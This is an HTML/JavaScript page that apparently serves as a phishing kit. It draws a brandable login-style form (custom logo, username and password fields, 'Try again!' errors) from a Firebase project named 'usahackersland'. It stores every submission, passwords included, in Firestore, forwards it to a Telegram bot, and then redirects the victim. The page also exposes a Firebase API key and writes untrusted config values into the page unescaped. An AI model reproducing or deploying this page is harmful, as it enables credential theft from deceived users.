<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title id="pageTitle">Form Submission</title>
<meta name="description" id="metaDescription" content="">
<meta property="og:title" id="ogTitle" content="">
<meta property="og:description" id="ogDescription" content="">
<meta property="og:image" id="ogImage" content="">
<meta property="og:type" content="website">
<style>
body{font-family:Arial,sans-serif;padding:20px;margin:0}
#formContainer{max-width:600px;margin:auto;padding:20px;border-radius:10px;box-sizing:border-box}
input,textarea,button{width:100%;padding:10px;margin:8px 0;border-radius:6px;border:1px solid #ccc;box-sizing:border-box}
button{cursor:pointer;border:none;font-weight:bold;transition:transform 0.1s ease}
button:hover{transform:scale(1.02)}
h2{text-align:center;margin:0}
.embedLink{margin-top:6px;padding:6px;border-radius:6px;word-break:break-all}
.warningMsg{color:red;font-weight:bold;margin-bottom:6px}
img.avatar,img.logo,img.banner{display:block;margin:10px auto;max-width:100%;cursor:pointer}
</style>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
</head>
<body>
<div id="formContainer">
<h2 id="formTitle"></h2>
<div id="formDesc"></div>
<form id="dynamicForm"></form>
<div id="embedLinks"></div>
</div>

<script>
const $ = id => document.getElementById(id);
const firebaseConfig = {
  apiKey: "AIzaSyB5zWUvl64s6wAjjeXd0mCUyhMEdzg_MmM",
  authDomain: "usahackersland.firebaseapp.com",
  projectId: "usahackersland"
};
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

const urlParams = new URLSearchParams(window.location.search);
const formId = urlParams.get("id");
const formEl = $("dynamicForm");
const embedEl = $("embedLinks");

let formConfig = null;

if(formId) {
  db.collection("forms").doc(formId).get().then(doc=>{
    if(doc.exists){
      formConfig = doc.data();
      setSEOMetadata();
      renderForm();
    } else {
      $("formTitle").innerText = "Form not found!";
    }
  }).catch(err=>console.error(err));
} else {
  $("formTitle").innerText = "Form ID missing!";
}

// Set SEO metadata dynamically
function setSEOMetadata(){
  document.title = formConfig.seoTitle || formConfig.title || "Form Submission";
  $("pageTitle").innerText = document.title;

  $("metaDescription").setAttribute("content", formConfig.seoDescription || formConfig.description || "");
  $("ogTitle").setAttribute("content", formConfig.seoTitle || formConfig.title || "");
  $("ogDescription").setAttribute("content", formConfig.seoDescription || formConfig.description || "");
  $("ogImage").setAttribute("content", formConfig.seoImageURL || formConfig.logoURL || "");
}

function renderForm(){
  // Apply form colors
  document.body.style.backgroundColor = formConfig.backgroundColor || "#fff";
  $("#formContainer").style.backgroundColor = formConfig.formBgColor || "#fff";

  $("formTitle").innerText = formConfig.title || "";
  $("formTitle").style.color = formConfig.titleColor || "#000";
  $("formDesc").innerText = formConfig.description || "";
  $("formDesc").style.color = formConfig.textColor || "#000";

  formEl.innerHTML = "";

  // Avatar & Logo
  if(formConfig.avatarURL) formEl.innerHTML += `<img src="${formConfig.avatarURL}" class="avatar">`;
  if(formConfig.logoURL) formEl.innerHTML += `<img src="${formConfig.logoURL}" class="logo">`;

  // Warning if enabled
  if(formConfig.enableWarning && formConfig.warningPosition !== "none"){
    formEl.innerHTML += `<p style="color:#b71c1c;text-align:${formConfig.warningPosition}">${formConfig.warning}</p>`;
  }

  // Username & Password
  if(formConfig.addAuth){
    formEl.innerHTML += `<input name="username" placeholder="${formConfig.usernamePlaceholder}" required style="background:${formConfig.inputBgColor};color:${formConfig.inputTextColor};border-color:${formConfig.inputBorderColor}">`;
    formEl.innerHTML += `<input type="password" name="password" placeholder="${formConfig.passwordPlaceholder}" required style="background:${formConfig.inputBgColor};color:${formConfig.inputTextColor};border-color:${formConfig.inputBorderColor}">`;
  }

  // Extra fields
  formConfig.extraFields.forEach(field=>{
    if(field){
      formEl.innerHTML += `<input name="${field}" placeholder="${field}" required style="background:${formConfig.inputBgColor};color:${formConfig.inputTextColor};border-color:${formConfig.inputBorderColor}">`;
    }
  });

  // Embed links
  embedEl.innerHTML = "";
  formConfig.embedLinks.forEach(link=>{
    if(link.show){
      const div = document.createElement("div");
      div.className = "embedLink";
      div.style.backgroundColor = link.bgColor || "#e8f0fe";
      div.style.color = link.textColor || "#000";
      div.innerHTML = `<strong>${link.text}</strong>: <a href="${link.url}" target="_blank">${link.url}</a>`;
      if(link.desc) div.innerHTML += `<br><small>${link.desc}</small>`;
      embedEl.appendChild(div);
    }
  });

  // Submit button
  if(formConfig.showMainBtn){
    const btn = document.createElement("button");
    btn.textContent = formConfig.buttonText;
    btn.style.background = formConfig.btnColor;
    btn.style.color = formConfig.btnTextColor || "#fff";
    btn.onclick = submitForm;
    formEl.appendChild(btn);
  }
}

function submitForm(e){
  e.preventDefault();
  const inputs = formEl.querySelectorAll("input,textarea");
  let hasError = false;

  // Remove previous warnings
  formEl.querySelectorAll(".warningMsg").forEach(w => w.remove());

  inputs.forEach(input=>{
    if(input.required && !input.value){
      hasError = true;
      const warning = document.createElement("div");
      warning.className = "warningMsg";
      warning.innerText = "âŒ Try again!";
      input.parentNode.insertBefore(warning, input);
    }
  });

  if(hasError) return;

  const formData = {};
  inputs.forEach(i=>formData[i.name]=i.value);

  db.collection("submissions").add({
    formId,
    data: formData,
    createdAt: new Date().toISOString()
  }).then(()=>{
    if(formConfig.enableRedirect && formConfig.redirectURL){
      setTimeout(()=>window.location.href = formConfig.redirectURL, 500);
    }
    formEl.reset();
  }).catch(err=>{
    console.error(err);
    const warning = document.createElement("div");
    warning.className = "warningMsg";
    warning.innerText = "âŒ Try again!";
    formEl.insertBefore(warning, inputs[0]);
  });

  // Telegram notification
  const telegramMsg = `ðŸ“ New Form Submission\n------------------\n`+
    Object.entries(formData).map(([k,v])=>`ðŸ’  ${k}: ${v}`).join("\n");

  fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage`,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ chat_id:"YOUR_CHAT_ID", text:telegramMsg })
  });
}
</script>
</body>
</html>
